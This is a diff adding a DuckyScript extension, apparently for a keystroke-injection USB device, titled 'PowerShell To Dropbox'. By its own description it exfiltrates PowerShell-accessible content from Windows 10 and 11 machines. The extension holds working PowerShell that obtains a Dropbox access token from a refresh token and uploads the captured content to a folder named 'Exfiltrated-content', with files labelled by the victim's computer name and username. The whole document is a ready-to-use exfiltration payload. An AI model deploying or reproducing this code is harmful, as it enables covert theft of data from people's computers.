@@ -1,0 +1,43 @@
+EXTENSION POWERSHELL_TO_DROPBOX
+    REM_BLOCK DOCUMENTATION
+        Title: PowerShell To Dropbox
+        Author: PlumpyTurkey
+        Description: This extension allows you to exfiltrate content available from PowerShell to a file in your Dropbox.
+        Target: Windows 10, 11
+        Version: 1.1
+    END_REM
+
+    REM Required options:
+    DEFINE #PTD_CONTENT $Content
+    DEFINE #PTD_REFRESH_TOKEN XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+    DEFINE #PTD_APP_KEY XXXXXXXXXXXXXXX
+    DEFINE #PTD_APP_SECRET XXXXXXXXXXXXXXX
+
+    REM Advanced options:
+    DEFINE #PTD_OUTPUT_FOLDER Exfiltrated-content
+    DEFINE #PTD_OUTPUT_FILE [${env:COMPUTERNAME}-${env:USERNAME}].txt
+
+    FUNCTION PTD_SEND()
+        STRING_POWERSHELL
+            try { 
+                Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers @{ 
+                    "Authorization" = "Bearer $((
+                    Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method Post -Headers @{ 
+                        "Content-Type" = "application/x-www-form-urlencoded" 
+                    } -Body @{ 
+                        "grant_type" = "refresh_token"; 
+                        "refresh_token" = "#PTD_REFRESH_TOKEN"; 
+                        "client_id" = "#PTD_APP_KEY"; 
+                        "client_secret" = "#PTD_APP_SECRET" 
+                    }
+                ).access_token)"; 
+                    "Content-Type" = "application/octet-stream"; 
+                    "Dropbox-API-Arg" = "{""path"":""/#PTD_OUTPUT_FOLDER/#PTD_OUTPUT_FILE"",""mode"":""add"",""autorename"":true,""mute"":false}" 
+                } -Body #PTD_CONTENT | Out-Null 
+            } 
+            catch { 
+                Write-Host "An error occurred: $_" 
+            }
+        END_STRING
+    END_FUNCTION
+END_EXTENSION
